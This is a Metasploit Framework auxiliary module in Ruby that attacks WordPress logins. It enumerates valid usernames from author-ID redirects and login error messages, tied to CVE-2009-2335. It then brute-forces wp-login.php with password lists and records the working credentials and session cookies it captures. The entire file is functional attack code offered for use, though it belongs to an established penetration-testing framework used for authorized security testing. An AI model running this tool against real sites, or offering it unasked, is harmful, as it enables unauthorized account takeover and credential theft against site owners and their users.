##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner


  def initialize
    super(
      'Name'          => 'Wordpress Brute Force and User Enumeration Utility',
      'Description'   => 'Wordpress Authentication Brute Force and User Enumeration Utility',
      'Author'        =>
        [
          'Alligator Security Team',
          'Tiago Ferreira <tiago.ccna[at]gmail.com>',
          'Zach Grace <zgrace[at]404labs.com>'
        ],
      'References'     =>
        [
          ['BID', '35581'],
          ['CVE', '2009-2335'],
          ['OSVDB', '55713']
        ],
      'License'        =>  MSF_LICENSE
    )

    register_options(
      [
        OptString.new('URI', [false, 'Define the path to the wp-login.php file', '/wp-login.php']),
        OptBool.new('VALIDATE_USERS', [ true, "Validate usernames", true ]),
        OptBool.new('BRUTEFORCE', [ true, "Perform brute force authentication", true ]),
        OptBool.new('ENUMERATE_USERNAMES', [ true, "Enumerate usernames", true ]),
        OptString.new('RANGE_START', [false, 'First user id to enumerate', '1']),
        OptString.new('RANGE_END', [false, 'Last user id to enumerate', '10'])
    ], self.class)

  end

  def target_url
    uri = normalize_uri(datastore['URI'])
    "http://#{vhost}:#{rport}#{uri}"
  end


  def run_host(ip)
    usernames = []
    if datastore['ENUMERATE_USERNAMES']
      usernames = enum_usernames
    end

    if datastore['VALIDATE_USERS']
      @users_found = {}
      vprint_status("#{target_url} - WordPress Enumeration - Running User Enumeration")
      each_user_pass { |user, pass|
        do_enum(user)
      }

      unless (@users_found.empty?)
        print_good("#{target_url} - WordPress Enumeration - Found #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
      end
    end

    if datastore['BRUTEFORCE']
      vprint_status("#{target_url} - WordPress Brute Force - Running Bruteforce")
      if datastore['VALIDATE_USERS']
        if @users_found && @users_found.keys.size > 0
          vprint_status("#{target_url} - WordPress Brute Force - Skipping all but #{uf = @users_found.keys.size} valid #{uf == 1 ? "user" : "users"}")
        end
      end

      # Brute-force using files.
      each_user_pass { |user, pass|
        if datastore['VALIDATE_USERS']
          next unless @users_found[user]
        end

        do_login(user, pass)
      }

      # Brute force previously found users
      if not usernames.empty?
        print_status("#{target_url} - Brute-forcing previously found accounts...")
        passwords = load_password_vars(datastore['PASS_FILE'])
        usernames.each do |user|
          passwords.each do |pass|
            do_login(user, pass)
          end
        end
      end

    end
  end

  def do_enum(user=nil)
    post_data = "log=#{Rex::Text.uri_encode(user.to_s)}&pwd=x&wp-submit=Login"
    print_status("#{target_url} - WordPress Enumeration - Checking Username:'#{user}'")

    begin

      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => normalize_uri(datastore['URI']),
        'data'    => post_data,
      }, 20)

      if res.nil?
        print_error("#{target_url} - Connection timed out")
        return :abort
      end


      valid_user = false

      if res.code == 200
        if (res.body.to_s =~ /Incorrect password/ )
          valid_user = true

        elsif (res.body.to_s =~ /document\.getElementById\(\'user_pass\'\)/ )
          valid_user = true

        else
          valid_user = false

        end

      else
        print_error("#{target_url} - WordPress Enumeration - Enumeration is not possible. #{res.code} response")
        return :abort

      end

      if valid_user
        print_good("#{target_url} - WordPress Enumeration- Username: '#{user}' - is VALID")
        report_auth_info(
          :host => rhost,
          :sname => (ssl ? 'https' : 'http'),
          :user => user,
          :port => rport,
          :proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}"
        )

        @users_found[user] = :reported
        return :next_user
      else
        vprint_error("#{target_url} - WordPress Enumeration - Invalid Username: '#{user}'")
        return :skip_user
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      return :abort
    rescue ::Timeout::Error, ::Errno::EPIPE
      return :abort
    end
  end


  def do_login(user=nil,pass=nil)
    post_data = "log=#{Rex::Text.uri_encode(user.to_s)}&pwd=#{Rex::Text.uri_encode(pass.to_s)}&wp-submit=Login"
    vprint_status("#{target_url} - WordPress Brute Force - Trying username:'#{user}' with password:'#{pass}'")

    begin

      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => normalize_uri(datastore['URI']),
        'data'    => post_data,
      }, 20)

      if (res and res.code == 302 )
        if res.headers['Set-Cookie'].match(/wordpress_logged_in_(.*);/i)
          print_good("#{target_url} - WordPress Brute Force - SUCCESSFUL login for '#{user}' : '#{pass}'")
          report_auth_info(
            :host => rhost,
            :port => rport,
            :sname => (ssl ? 'https' : 'http'),
            :user => user,
            :pass => pass,
            :proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}, COOKIE=#{res.headers['Set-Cookie']}",
            :active => true
          )

          return :next_user
        end

        print_error("#{target_url} - WordPress Brute Force - Unrecognized 302 response")
        return :abort

      elsif res.body.to_s =~ /login_error/
        vprint_error("#{target_url} - WordPress Brute Force - Failed to login as '#{user}'")
        return
      else
        print_error("#{target_url} - WordPress Brute Force - Unrecognized #{res.code} response") if res
        return :abort
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end

  def enum_usernames
    usernames = []
    for i in datastore['RANGE_START']..datastore['RANGE_END']
      uri = "#{datastore['URI'].gsub(/wp-login/, 'index')}?author=#{i}"
      print_status "#{target_url} - Requesting #{uri}"
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => uri
      })

      if (res and res.code == 301)
        uri = URI(res.headers['Location'])
        uri = "#{uri.path}?#{uri.query}"
        res = send_request_cgi({
          'method' => 'GET',
          'uri' => uri
        })
      end

      if res.nil?
        print_error("#{target_url} - Error getting response.")
      elsif res.code == 200 and res.body =~ /href="http[s]*:\/\/.*\/\?*author.+title="([[:print:]]+)" /i
        username = $1
        print_good "#{target_url} - Found user '#{username}' with id #{i.to_s}"
        usernames << username
      elsif res.code == 404
        print_status "#{target_url} - No user with id #{i.to_s} found"
      else
        print_error "#{target_url} - Unknown error. HTTP #{res.code.to_s}"
      end
    end

    if not usernames.empty?
      p = store_loot('wordpress.users', 'text/plain', rhost, usernames * "\n", "#{rhost}_wordpress_users.txt")
      print_status("#{target_url} - Usernames stored in: #{p}")
    end

    return usernames
  end

end
